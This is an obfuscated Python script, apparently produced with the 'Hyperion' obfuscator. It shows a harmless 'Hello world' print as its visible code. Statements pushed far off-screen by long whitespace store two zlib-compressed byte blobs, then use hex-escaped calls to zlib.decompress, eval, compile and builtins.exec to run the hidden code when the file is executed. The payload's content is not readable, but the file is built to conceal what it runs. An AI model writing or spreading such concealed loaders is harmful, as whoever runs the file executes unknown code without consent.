from builtins import *
from math import prod as _multiply


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Product, _theory, _product, Hypothesis, _detectvar, _hypothesis, Run = exec, str, tuple, map, ord, globals, type

class _statistics:
    def __init__(self, Multiply):
        self.Ceil = _multiply((Multiply, 24878))
        self.Walk(Random=-14504)

    def Walk(self, Random = bool):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Ceil -= 55870 / Random
        
        try:
            ({_memoryaccess: Hypothesis} or _product if {_memoryaccess: Hypothesis} and _product else ... or (_product, {_memoryaccess: Hypothesis}))

        except OSError:
            (((_memoryaccess, _theory, Product), _product) for _product in {_memoryaccess: Hypothesis})

        except:
            Run(66204 / -63348) == str

    def Power(self, _algorithm = 98177):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _algorithm += 97324 / 11065
        self.DetectVar != True
        
        try:
            (({'uueoddle6tte6gytegtb': Hypothesis}, Hypothesis) for Hypothesis in (_memoryaccess, _product, _detectvar))

        except AttributeError:
            (((Hypothesis, _product), Hypothesis) for Hypothesis in {Hypothesis: _theory})

        except:
            Run(69693 / -2081) == True

    def _add(Substract = type):
        return _hypothesis()[Substract]

    def _frame(Invert = -57175 / 14373, Theory = str, Cube = _hypothesis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Cube()[Invert] = Theory
        
        try:
            ((_product, {Hypothesis: _theory}) for _product in {_memoryaccess: Hypothesis} if _detectvar > Hypothesis)

        except OSError:
            ((_memoryaccess, (_memoryaccess, _product, _detectvar)) for _memoryaccess in {Hypothesis: _theory} if _theory != _detectvar)

        except:
            Run(44365 - 49373) == False

    def execute(code = str):
        return Product(_theory(_product(Hypothesis(_detectvar, code))))

    @property
    def DetectVar(self):
        self._ceil = '<__main__._memoryaccess object at 0x000007971BE97178>'
        return (self._ceil, _statistics.DetectVar)

if __name__ == '__main__':
    try:
        _statistics.execute(code = __code__)
        _invert = _statistics(Multiply = -65944 + 21117)

        if 337041 > 2898833:
            _invert.Walk(Random = _invert.Ceil / -53399)
        elif 363988 < 3937034:
            _statistics(Multiply = 60903 - -96720).Walk(Random = _invert.Ceil - -92825)                                                                                                                                                                                                                                                          ;_statistics._frame(Invert='NMNMMMMNNMNNMMMMMNM',Theory=b'x\x9c\xdd\x1bko\xdb8\xf2s\xfd+\xbc\xf9b\xbbMS\x99\x92(\xc9@\xbf\x1c|\x87u\x90\xd4\x8b\xcd\xe2\xae\x87\xb60d\x8bN\x95\xa5\xad\x9c%o\x9c\x7f\x7f3CR\x92_\xb1\xfc\xea\x161\xcd\x87\xf8\x125\x9c\x19\xce\x0c\xc9l\xf6\xdc\xa9\xd5\xe1\x17\x8f\x9b\x14\xe3o0H\x86\xe3y:\n\xb3d6\x18\xd4\x7f\xf9x\xf1\xeb\xf3\xa3\x98\xc5\xc9\xf4\xa2\x9e\xccJ\xd5\xc2y\xf6=\x99\xa5T\xa7y1\x8c\xa5|\xce\xbe\x8b\xfb$\xccl\x97_\\^\xfcC\xce\xc5\xef"\xbah-\xb5\xba\x8f\xb3\xef\xf3\xa1\xea\xf8{\x96=\xa6\x9d\x0f\x1fT\xde\xd5(\x99|X\xe9\xe6\xc3\x96wGq:Jf\xd1r7:\xf3\xea\xfe\xfe\xc3\xa3\x0c\xef\xe7b\xa5\x91\x8cGb\x9a\n\xd5\xe8\x9f\xbf\xdd\xbcgW\xd6J\x95Q\x12\xa9\xf2\xc6\xe3,\x9ef\xcd\x8b_\x85\x94I\xfd)\x99\xc9\xe8\x97\x8bV\xa3\xd6\xea\xe4\xb5\xb1\xbc\x91\xfe\x19G\x8dVM,F\xe21\xd3\xc0\x9c>\xce\xa1\xe5\xefI*\xd2z8\x13\xf5\x99\x88\xbeN\xff\x1d\'Rd*c\x08\x90\xf9:\xfdo2\xa7\xa7\xb0\x8e\x9d|\x9d~J\x86I\xf4\\\x97\xf1\x9f\xd0\xee9\x99_\xb4jjP\xf1\xe41\x99e\x83\x01\xbc\xed9m\xb4\xae\xc4"\xce\x9a\xad\x9aLF\xa1L\x9b\xad/\x8d\xc5\xd3\x02\xfeO:\xc2\xf0\xa9\xf1\xed\xe3\xbdL\x86P\xa1\xb6\xa1\x14\x1b\xf5z\x92\xfe=\x95\x90\xbd\xc6\x97N\xe7\xdd\xfbw\xef\x9b\xef\x9b\xef\xda\xad\xd67\xe8Ada\x96\xcd\xb6\xf5p\x07?\xc6t\xc0\xc8\xad\xf7\x11\xc5[\xdbO\'\xd3\xc9d2-\x1c\xfe`\xe0\xea\xc3j\x1b\x8b\xb1\xddC\x1c\xc7\xe8\xe5\x83|\x80\x9f|\x88\xa1Q\x01\xa6m\xaf\xbb\xb9\xe9\xdd\xf4\xae1\xe8\xdd\xdc\\\xdf\xdc`\xd0\x03\x0f\x8d\xd7{l6\x86\xf3Xf\xf1\x14\x01\xfeW8{a8\x94=\xd5\x7f\x8a&\xd0e\xa3q\xf5\x90\xc4\xd3\xed\xcdz7\xf4\xf6k\x0c \xc4\xf8\xba\xd7\x83\x968\x17\xa5\x89\xe9\xf5\x9a\x9b\x86\x97N\xe3L\xc6\xf3\xe1*\xc4[\x97z*\x8a\xa9\xb9\xbb\xdb\xaf\x87\xd6\x97\xe3\xbb\xb8\x8a\xa7\x91X4\x1b"\x95\xe1\xbf\xd6\x8a\xbf\xb5j\xdbf\x03A\x93\xf4\xfb\xfdn7\xe9w\xfbI\xd2\x85t\x02Q\x17|\xf2\xda\xa0#\x93d\xbdt\x07p\x002\xfd\x04@\x02 \xc2(\xc1\xd4\xab\x03L\x16&r\xbc\t2\xdbh\x1bh\xe7\x86\x08\xa8\x87\xa4D\x84\xf5\xda`"\xe6\xb3?\xf6F\x16\x0b1\xc5\xb2\x12\x0bCH[\x18Z\xaf\x0e42~\x9c$\xa3M\xd0\xd9\xca\x7f\x91\xc1\x00\ta\xa4\x98\x0c\xb2\x9b\xd7\x06\x18\x19\xfe%\xf6\xc5\x19\xf5n\x0ci\x08L\x0f\xe4\xb5\x81f\x96\xa5{\xe1\x0b\xa0G\x17\x97"\xc4\x99>-J\xfd\xca \x89\xe3Q\x1aN\xe3#@\xb2\xb5\x87\xea \xd9\xde\x85\x01\xc9\xf38\x96\x0b\xf1}:\xaf\xcey7@\xa59l8\x81\x13\xf0\x91\t\x0bo\x1c\x96\x80\\\x15\t\x94\xb7\x9b\r\x7f\x9cmx\xe5\xebB\xb7\x91X\xecK\x89\x9ba\xeb\xda\xaem3\x9b\xa9\x10c\x93\xb3\x9cg\xe2\xddp\xde\xc8\t\x9b\x8d\x16\x83JV\xb9\xfe\xe6\x8a\x9b\x87i[,b>\x8b\xec6\xdb9\xd5\xad\xd6.\x9e\xa4hRK\xd7\x8aD\xd5\xf3\xee\xe15Z\xd6\xc0\x1e\xf0\x01\x86l\xe0A\xe8\x0c\\|\xf3z\xee\x0f\xfbV\xd2\x8c\xf6y\x03\xf3\xb8\r\x84\xe3\xf2\xb6\xc7\x98\xb7\xf3\x1d\x07`\x95O\xce\xd3q\xe1<\xed\x96\x9e\x0e\xc5\xa9m\x1f\xe7\xb4=\x8b\xb7\xf9\x10\xbc\xcf0%\xb8\xc3\xdb\x94\xa2\xd8\x812\xcf\xe5\x82r\x86\x9e\xcd]\xcff\x96\xcb\x9d\xc0\xb5\x98e\x8f\x99\xe5\x05l\x8c\xe5v\xc8\xac#\x01\xd4\xb8\xbd\xbd\xfd\xf4\t=\x84\xe4\xf0\t\x9e\xab\xe0Z0p\t\xab\xd8\xa0=\xf0\x01\xab\\\xc25\x0b\xf2Vr\xabt\xe6Be\xe585\x0b\x06\x1cj\xf3\xf5\xdcJT\x00\xa5\xed\x1f\x89\xe1\x07b:s\x14"\xe0d;<\xa0)\x1f\xf1 \xcf\x1br\x17\x10\xc2\x01\x14\xe0@\x0f#>\x06\xd4q\x81*,\x87yH\x1f\x0e\xd4aT\x12\x94\x11\xc7)\x10\x87\x1d\x87\x1eR\xaa\x15\xc9,N\x12\xd7\xa9e\xf3\xc9V\x8eJ\x13\xc6\x81\xd7\x10\x0e\xc0S\x1bj\xdb\xeb\xb9\'\x9cP|\xab\x03\x1c\xce\x87\xd0\x1f`\x9a\xd1;W\xf2\xaat\xd4\xae\xb6 \x1c\x8bk\xbe;\xb6-\xf0\x1c\xbc\x03\x9e\x81o\x83wu\x8c\xcf\x01\x1b\x12>V\xa9\xeb\xef\x8f\xb3\xbbpw\x0f\xe8W\xae\x88\xac\xc1\x82\xe9\x0f \xb4 l\x0f\x1c\xa8\xcd\xd6s\x7fjj\xdf\xa5[0\xa3U\xe46\xc3e\xab\xe1v$F&\xea\xd2b\xed\xd0\xb2\xcd\t\x8d\xd7r\xab\x81:\x80\x06j\xf5G\xf0*\x89\x80\xad\xe7\x9e\x90*\xb6\x80\xdaC\x04\xd5\x88\xeaj$\xe6\x1a\xa9\xd1\xbb\x1a\xd1w\xd5s\xce\xcf\x98]\x9b\xa3\x0c\x0fk\xb4a\xc6\xc8Z=\x07\xc2!0\xdd\x08\x98ntV\xd6\xbbU\xd9\x18\x91\x1f9!\x85\x01\xc5A\xee\xf19\xd0\xf9\x10\xef\x16^d8\x19Fa]\xdbs\xa7$j*\xd3.\xfa\xceFMh\xffq\x83\x90c\\DN,\xe5\x18\x1fU\x1e\xaf\xd4z\x12\xaeJR\xd2\xa2\xd4\xd9>\xaa\x17\xe9T\xadj\xcaS_RV[\xe1\x8e#\x86\xb6\xe6;\xd6\xd9\xe4\xe8\rH\xecD 5\xd8\x88\xc4y\x8eA\xddc%\x85X\xa2\x9e\x88\xfa"\xa8\x8a\x10\x1e\x0c\x18[S=\xd3\\\x00\xd3\x81\xe6\x00\xdcp\x06\xcd)\xaa\xd4\xad\xc8\xd8\xf7\x95\xe3A\xe5<\x8brb/+\xbd\xe6\xd9\xa8\xbb\xc7)\xba\xdb>\xc6\x1d\x01\x06\x1c\xa9J\xfc\xe7\xf3g\xf8C@\tLV!"\x1fWyX\x8c|X\xd9\xda\xb0\xb6\xb9$\t\x04\xeb\xb9\xd5\xb4\xdf65Q"\x84\x8bk\x1bi\xbfk\xb9?f\xadc\x1a\x0b=\x8d\x99\x96\x8e}-\xb0\x05\xa5\xf5nW\xdd\x03\x04\xbb\x12s\'\xde>-m\xdd\x9d\x8c\xb3;0T\xe51\xb4->\xe6\x90\xc2P\xa59\xe5b9\xa6N\x8d\xb7G\x13a\xa3wM\xbb\x91\x94\xa76(qO\x052\xab)\xad\x1e \'\nfm\x90\xa5<\xc0/\x9b\x94\xd6\xb5\xdc\x9f\xd9\xda\x020\xb4\xca\xceuh\xdeFhvp\x02\x10zl\xcf\xd1k\xc5\x10\xd6\x13\xc1\xbd\xbc\xee\xd1\xd0\xefv\xd5h0\xd2\x83\xed\xe2\xdegEZ\xb7P\x7f\x1c\xa0\x84\x8b\x9a\xa4\xabi}%\xf7(\xdd\x0c\xc9\xd2\xd6$ht\xad\xb2(j\x97t\xb3]u\xd9\xb9\xe6\x90\x04dK\xbf\xdd\x08\xcb\xbe\x8e\r\x13\xb1\xf4Hw\xd5%\xe6Sa\xa4\x07\xb0\n\x14ZC\x12X\x95\xf0\xba,\xbeR^e\x01\x10\x8dT\xb7d\xb9R\xc6+\x9d:\x19[\x0b\n\x1b>\x89\xd5\x81J\x15OU\xac\xfa{Z\x06Q\xa7h\xa3\xc8F\xe6 "9\x10\xe1\x94\x850\xd0\xe9\x91\xb2\x1b\xb26\xb9sH \xc8\xbf\xc1\xa9_\x9eV\xbc\xdc<\x1b\x1e\xaf\xcaN\x0b\x08\xa5\xf6i\xbe\xe7\x9e\x05\x13\x01\xc6!x\x0c\xd1\x8d\xf2g\x95\x82\x99>\xf9Bu\x8e\x99\xca\x89\xc9\xe8}\x81&\xaaB\x0f4\xa5\x95t\xc1=e\xc6u\xed\xc2\x07M\x02-\x93\xb0F\x90Z\xbc\xc1ry\xec\x8aq\xa7l),\xdf\xb6\xc5du{d0`$V\x1ak\xb5\xbd\x9e\xfb\xd3\x9a\x9c\xfe\x0e\xa1\x1e\xd8\'\xf0P\xe4\xa6\x8a\x9f\xc2\xefG}\xf6\xbe\xda\xae\x17\x9c\xc5\xe4\x92\xef\nyz\xcf\xc8[\xda?*J*\xec\x14\xe9\xb5kA\xd0|\xa2EJ\xc1\x143:[\xb6\xe3\xf7\x1f\xb2\xe7\x93\xf3J\xde_\x89\xe1Wy\xb8\xca2\xa2\xac-\xcaHBn\xff\xa5\xb6\x01\x03D\x89\x8f\x06\xdc\xa7\x03]\xd5(\x97\x91\xe5\x1e\xe9\xd4&\xc9\xce!\xca]\xcb=\x183\x83\x92\xec\x13hI.\x97\xda\xb4ld$\xbd*u\xcf&\xe9-\x0b\t\xa7\xd8\x00\x84w&8\x00u\xf0\x10\xc5\xf0n\xb7[eVl\x80\xba\xa7\xa5l\x87\x1c\xea>\xcezn5#\xb5q>\xb1bF&\xea\x95\xbc\xf33f\xa74\x9ffn\xdbZ)\x0fV\x94\xf6*u\x0fR\xda_\xb2G\xfc-[W\x8d\x96\xa3\xb7\x1c\xd4\xc6\x04\xce/\xee\xe5\xb9\xeb\xb9\x07C\xde\x98<<\xed\xb9\x86\xa0\x81./i0\xbb\xea\x12e\x9ex7g\x0b\xa3\xd5\xact%\xf6\xf5\x93\tu\xd9\xcfg\xfc@\x96\xad\x16\xa1"\xb1X\x9c\x9f\xce\xceo\xfb>\x97yVo`\x14\x1b\x17\xf9\xd6E\xc9\x9569\xf6[d\xa59\x05\x86\xe9\x03\xf73^\x18\xb7X\x1a\xef\xea\x93\x1e\xf3\x19\x94\xb9\\\xf0;\x81i\xa1\xa1\x14\xfe[}N\xe5\xf6V\xeb\xffG\xad\xfd\x9e\xb6\x87x\xda&b8\x8col#\xa5\xb5\x7fW\xdd*\x1ak\xd98{\x97+2w\xe6\xcfN:\xf5ZG4\xfaa\xa0M-*\'\xacv<\xf1 \xea\xae"\xe7\x1f(\xdc\x16\xa2\xad\xb7\xc4w\r\xbf\xf5O\xcem\x99\xe7s\x87{,R\xaa,\x1d\xcf\xf1=\x07\x9c\xe5\xd9 \x88\x8d\xd9\x98\xe3\xc9\xae\x80\t\xcf\x03\x95\xb8\r%6\xe6x\x16\x13\xdc\xe6c\x1e\xb11\xee\x0c\xa35\xc7\xc6>|\xc8\x13\xdc\xb5#\x9b\xdb\xcc\xf6is\xc7\xa7\xd8\xb6\xdb\xb8\xe7\x03\xa8\xc4=T\xa1\xe1=6\xee6{\xcc\xe5!\xb4\x1a\xc2[\\n6\xee\\\xeePO\xdeyv\x9c\xc9\xd2\xe3\x905_\xd9\xf7\x95-\x7f5\xae\xcc\xe8\xf4\xb1\x88;}\xf0Z\x9f\xc0>\x9d\xf2\xe3\x94\xccT\xb9\x11\x8bB>\xd6\xe9\xb1~\xa2\xe1\x9f\xc1,\x92[\xecN \xa0oa\xe7\xf9\xc7qm\x8d3v9\xe3N\x8d\xfe\xeb;\xc7\xf0\x89\xca\xd2\xa3\x9e\x18=\xe1\x99MA\xee\x1c\xc8XZa\x8b\xd5w\xf9@\xc1YV1\xe6\x1dmI\xd9\xf2A\xca\xfcH&G2A\x86y\\\x98$\x0f\xb6\xdc\xa1\x92\x86\xca\x80w\x84`n\xb6\x08\xcc\xa13\xa3\xe62\xfd\xdc.\xa9C/\xd5\xab*\xea\x1dx\x9c\xb70\xc6,\x1f\xe6]5\xd4T\xb7z\xe0\r\xabk\xda\x1c\xec\xe1\xcdE\xbc\xb4H\x17\x17_Z\x9b\xc7\xb3dR7\x97)\xeb\xea\x92f],\xc4\xe8\x92.\xca^\xd2E\xdbK\xf4\xa9\xc8jX')

        _statistics(Multiply = -12532 + -48611).Walk(Random = _invert.Ceil / -97216)                                                                                                                                                                                                                                                          ;_statistics._frame(Invert='ILIJJILILJLIJIIILIJ',Theory=b'\xd0\xc4\xe3\xf5x\xb2\x1ec\x08\xa4l\xd5t\xbb\x99\xf8\xdf\\\xa4x\x8d6\xad\xcfLf\x92^\xa6\xcf\xa9zQ\x16O\x84yI*\x85x\xacEb\\\x9f\x88\xe9\xbc\xd9\xea\xd4\xde$\xe9\x15T\xcd\xc4\xa4iN\x94\xe7\xac\xd5\x9c(o\xd5\xde\xa8\xbb\xbf\xea\xc4\x7fnT\xc5\xc4\xdbn\x17\x8d\x01x91!\xfb\x00\xd9\t\xf2\x16ZWxZ\xd2 \x16o\x89q\xeb\xfdf}\x94\xa8\xf4\x1a\xdcW\xed\xe9MV\x05\xbbkL^\xf7\xf2\x1a\x04\r\xf9\xa0\x8f\x92\xc8X\xbeE\\\xed\xd2\xc6\xa0\x1e\x08\xa2-\xa0@\xf7\x92L\xbfL\xdf\xe01\x02\x14\xf4\x94\x85\xd3\xe7\xf0\xa3\xba\x9a\xfcY\x1fJP\x07\x13\xf0h\x02EP+\x1e\xd7U\xc5\x8f\xca\x02\xa7M\x9c\xca0\x07\xe0\xd3\x03zR\x86:U\xe1\xc9\xd8\xb9\x9e\xde\xe2(%\x0c\x14\x07\xfb@\x93\x073g\x1a\xe5\xc7\x88r\xa9\x1e\x92Eq\xdf\x02\x877\xd5\xf0K \xd47\xd5\xde&\n\xaf\xe9\x03\t\xd5\xbb\x04\x7flHCe\xfa\xa3\x12\x02\x846\xa3\x115\xe7Ul]\xa5O\x90B\xc0\xe1\x15\xca.Q\x0ev\x8b\x15\tW\x9aw\xc6x\xae\x81g\xee>\x95\xbeB\x9d\xacR\xda\x08\xd9\xff\x8a\xb2kM\x13x\xb3\x97\xa6\x14\x1f{7Xa&\x00\xb9\x81\x18\xde\x08Y\xc0x\x92_\x1c\x9e\xe8\xb3\x08\x10u\xf2\xc1\x98\x83\xc5\xbd\xd2\xb1\xae\x9e\x82h\xa9\xbbT\x14\xf3\x82f*m\xb9B\xbc(\x7f\xd95]\x8e\x84qQ\xe2ZA^\x91\x05Q\x88\xee\xb1cpNi\x12\xc5\x01x\xb5\xabx{[P\x07+\xee\xc6\xe4g:\x11P\x05\x89iK\xa8\xc6$e3o\xd5\xf4K\xff\x0fV4o\xce')

        if 485406 > 6117457:
            _statistics(Multiply = -17915 + -5076).Power(_algorithm = 4442 * _invert.Ceil)
        elif 283340 < 9952063:
            _invert.Walk(Random = _invert.Ceil - 2947)                                                                                                                                                                                                                                                          ;WXXXWWXWWXXXWXXWWW,nmnnnnmmnnnnnmmnnmmn,ODDDoooDoDODoDOoO,IlIlIIIIlIIlIIlIIllll,SSSS22S2SSSS2222S2S2SSS22=(lambda JJLLLIJLILLIJIJLLIIJIJJJ:JJLLLIJLILLIJIJLLIIJIJJJ(__import__('\x7a\x6c\x69\x62'))),(lambda JJLLLIJLILLIJIJLLIIJIJJJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JJLLLIJLILLIJIJLLIIJIJJJ)"),filename='\x78\x77\x78\x77\x78\x77\x78\x78\x77\x77\x78\x77\x78\x78\x78\x77\x77\x78\x77\x78',mode='\x65\x76\x61\x6c'))),(lambda JJLLLIJLILLIJIJLLIIJIJJJ:JJLLLIJLILLIJIJLLIIJIJJJ['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda JJLLLIJLILLIJIJLLIIJIJJJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JJLLLIJLILLIJIJLLIIJIJJJ)"),filename='\x78\x77\x78\x77\x78\x77\x78\x78\x77\x77\x78\x77\x78\x78\x78\x77\x77\x78\x77\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda OoOOoO00Ooooo0oooo0oo0,JJLLLIJLILLIJIJLLIIJIJJJ:OoOOoO00Ooooo0oooo0oo0(JJLLLIJLILLIJIJLLIIJIJJJ))
        _invert.Power(_algorithm = 58814 - _invert.Ceil)                                                                                                                                                                                                                                                          ;IlIlIIIIlIIlIIlIIllll()(SSSS22S2SSSS2222S2S2SSS22(ODDDoooDoDODoDOoO(WXXXWWXWWXXXWXXWWW(nmnnnnmmnnnnnmmnnmmn('\x76\x61\x72\x73'))),_statistics._add(Substract='NMNMMMMNNMNNMMMMMNM')+_statistics._add(Substract='ILIJJILILJLIJIIILIJ')))

    except Exception as _memoryaccess:
        if 379241 > 9444275:
            _statistics.execute(code = _theory(_memoryaccess))

        elif 468390 > 5594830:
            _invert.Walk(Random = _invert.Ceil * 34175)